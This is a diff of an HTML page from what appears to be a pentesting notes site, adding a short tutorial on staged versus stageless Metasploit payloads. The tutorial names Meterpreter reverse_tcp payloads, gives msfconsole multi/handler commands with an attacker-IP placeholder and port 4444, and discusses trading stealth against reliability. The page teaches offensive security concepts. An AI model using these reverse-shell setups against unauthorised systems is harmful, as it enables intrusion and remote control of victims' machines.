@@ -8,7 +8,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
-    <title>Scripts and Tools &#8212; MyHackBook</title>
+    <title>Payloads &#8212; MyHackBook</title>
   
   
   
@@ -43,11 +43,11 @@
     <script src="../_static/doctools.js?v=fd6eb6e6"></script>
     <script src="../_static/sphinx_highlight.js?v=6ffebe34"></script>
     <script src="../_static/scripts/sphinx-book-theme.js?v=fab101a9"></script>
-    <script>DOCUMENTATION_OPTIONS.pagename = 'Scripts and Tools/index';</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Fundamentals/payloads';</script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Blogs" href="../Blogs/index.html" />
-    <link rel="prev" title="Cross-Site Scripting (XSS)" href="../Web%20App%20Pentesting/xss.html" />
+    <link rel="next" title="Password Attacks 101" href="password-attacks.html" />
+    <link rel="prev" title="Shells" href="shells.html" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="docsearch:language" content="en"/>
   <meta name="docsearch:version" content="" />
@@ -146,10 +146,10 @@
         <p aria-level="2" class="caption" role="heading"><span class="caption-text">Contents</span></p>
 <ul class="current nav bd-sidenav">
 <li class="toctree-l1"><a class="reference internal" href="../start-here.html">-&gt; Start Here</a></li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="../Fundamentals/index.html">Fundamentals</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
-<li class="toctree-l2"><a class="reference internal" href="../Fundamentals/shells.html">Shells</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../Fundamentals/payloads.html">Payloads</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../Fundamentals/password-attacks.html">Password Attacks 101</a></li>
+<li class="toctree-l1 current active has-children"><a class="reference internal" href="index.html">Fundamentals</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="shells.html">Shells</a></li>
+<li class="toctree-l2 current active"><a class="current reference internal" href="#">Payloads</a></li>
+<li class="toctree-l2"><a class="reference internal" href="password-attacks.html">Password Attacks 101</a></li>
 </ul>
 </details></li>
 <li class="toctree-l1 has-children"><a class="reference internal" href="../Active%20Directory/index.html">Active Directory</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
@@ -184,7 +184,7 @@
 <li class="toctree-l2"><a class="reference internal" href="../Web%20App%20Pentesting/xss.html">Cross-Site Scripting (XSS)</a></li>
 </ul>
 </details></li>
-<li class="toctree-l1 current active"><a class="current reference internal" href="#">Scripts and Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Scripts%20and%20Tools/index.html">Scripts and Tools</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../Blogs/index.html">Blogs</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../Writeups/index.html">Writeups</a></li>
 </ul>
@@ -261,7 +261,7 @@
       
       
       
-      <li><a href="../_sources/Scripts and Tools/index.md" target="_blank"
+      <li><a href="../_sources/Fundamentals/payloads.md" target="_blank"
    class="btn btn-sm btn-download-source-button dropdown-item"
    title="Download source file"
    data-bs-placement="left" data-bs-toggle="tooltip"
@@ -324,7 +324,9 @@
 <button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
     <i class="fa-solid fa-magnifying-glass fa-lg"></i>
 </button>
-
+<button class="sidebar-toggle secondary-toggle btn btn-sm pst-navbar-icon" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
 </div></div>
       
     </div>
@@ -335,11 +337,21 @@
               
 
 <div id="jb-print-docs-body" class="onlyprint">
-    <h1>Scripts and Tools</h1>
+    <h1>Payloads</h1>
     <!-- Table of contents -->
     <div id="print-main-content">
         <div id="jb-print-toc">
             
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#staged-multi-stage-payloads">Staged (multi-stage) payloads</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stageless-non-staged-payloads">Stageless (non-staged) payloads</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#when-to-use-which">When to use which</a></li>
+</ul>
+            </nav>
         </div>
     </div>
 </div>
@@ -349,8 +361,56 @@
 <div id="searchbox"></div>
                 <article class="bd-article">
                   
-  <section id="scripts-and-tools">
-<h1>Scripts and Tools<a class="headerlink" href="#scripts-and-tools" title="Link to this heading">#</a></h1>
+  <section id="payloads">
+<h1>Payloads<a class="headerlink" href="#payloads" title="Link to this heading">#</a></h1>
+<section id="staged-multi-stage-payloads">
+<h2>Staged (multi-stage) payloads<a class="headerlink" href="#staged-multi-stage-payloads" title="Link to this heading">#</a></h2>
+<p>Staged payloads use a small initial stager that connects back to the attacker and then downloads/extracts the larger payload (the “stage”). This keeps the initial network footprint small and is the default for many Meterpreter payloads.</p>
+<ul class="simple">
+<li><p>Example Metasploit payloads:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Example handler (attacker):</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfconsole</span>
+<span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+<span class="nb">set</span> <span class="n">PAYLOAD</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="nb">set</span> <span class="n">LHOST</span> <span class="o">&lt;</span><span class="n">attacker</span><span class="o">-</span><span class="n">ip</span><span class="o">&gt;</span>
+<span class="nb">set</span> <span class="n">LPORT</span> <span class="mi">4444</span>
+<span class="n">run</span>
+</pre></div>
+</div>
+</section>
+<section id="stageless-non-staged-payloads">
+<h2>Stageless (non-staged) payloads<a class="headerlink" href="#stageless-non-staged-payloads" title="Link to this heading">#</a></h2>
+<p>Stageless (non-staged) payloads contain the full payload in a single stage. They avoid a second-stage download, which can be more reliable across unstable networks and sometimes simpler for bypassing certain network restrictions.</p>
+<ul class="simple">
+<li><p>Example Metasploit payloads:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span>
+<span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Example handler (attacker) — same setup but with the stageless payload:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfconsole</span>
+<span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+<span class="nb">set</span> <span class="n">PAYLOAD</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span>
+<span class="nb">set</span> <span class="n">LHOST</span> <span class="o">&lt;</span><span class="n">attacker</span><span class="o">-</span><span class="n">ip</span><span class="o">&gt;</span>
+<span class="nb">set</span> <span class="n">LPORT</span> <span class="mi">4444</span>
+<span class="n">run</span>
+</pre></div>
+</div>
+</section>
+<section id="when-to-use-which">
+<h2>When to use which<a class="headerlink" href="#when-to-use-which" title="Link to this heading">#</a></h2>
+<p>Choosing staged vs stageless depends on network constraints, detection risk and reliability. Staged payloads have a small initial stager (smaller network footprint, can deliver larger payloads) but require a successful second-stage fetch which can be blocked by egress filters or unstable networks. Stageless payloads contain the full payload up front (more reliable when stage downloads fail or are blocked) but are larger and sometimes easier for network/AV controls to detect or truncate. In practice, try the staged option when outbound connectivity is likely and you want a smaller initial footprint; if the stage download fails or the environment blocks egress, switch to a stageless payload. For thorough testing, try both approaches and pick the one that balances stealth and reliability for the target.</p>
+</section>
 </section>
 
 
@@ -365,20 +425,20 @@
                   
 <div class="prev-next-area">
     <a class="left-prev"
-       href="../Web%20App%20Pentesting/xss.html"
+       href="shells.html"
        title="previous page">
       <i class="fa-solid fa-angle-left"></i>
       <div class="prev-next-info">
         <p class="prev-next-subtitle">previous</p>
-        <p class="prev-next-title">Cross-Site Scripting (XSS)</p>
+        <p class="prev-next-title">Shells</p>
       </div>
     </a>
     <a class="right-next"
-       href="../Blogs/index.html"
+       href="password-attacks.html"
        title="next page">
       <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Blogs</p>
+        <p class="prev-next-title">Password Attacks 101</p>
       </div>
       <i class="fa-solid fa-angle-right"></i>
     </a>
@@ -388,6 +448,25 @@
             </div>
             
             
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item"><div
+    id="pst-page-navigation-heading-2"
+    class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#staged-multi-stage-payloads">Staged (multi-stage) payloads</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stageless-non-staged-payloads">Stageless (non-staged) payloads</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#when-to-use-which">When to use which</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
               
             
           </div>
